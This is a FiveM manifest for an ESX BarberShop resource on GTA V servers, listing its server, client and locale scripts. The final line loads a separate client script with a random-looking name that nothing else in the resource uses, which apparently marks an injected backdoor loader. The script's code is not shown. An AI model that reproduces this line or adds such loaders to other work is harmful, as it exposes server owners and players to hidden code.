fx_version 'bodacious'
game 'gta5'

description 'ESX BarberShop'

version '1.0.1'

server_scripts {
    '@mysql_async/lib/MySQL.lua',
    '@essentialmode/locale.lua',
    'locales/br.lua',
    'locales/de.lua',
    'locales/en.lua',
    'locales/fi.lua',
    'locales/fr.lua',
    'locales/es.lua',
    'locales/pl.lua',
    'config.lua',
    'server/main.lua'
}

client_scripts {
    '@essentialmode/locale.lua',
    'locales/br.lua',
    'locales/de.lua',
    'locales/en.lua',
    'locales/fi.lua',
    'locales/fr.lua',
    'locales/es.lua',
    'locales/pl.lua',
    'config.lua',
    'client/main.lua'
}

client_script "DISqkiIEcVydGenWnD.lua"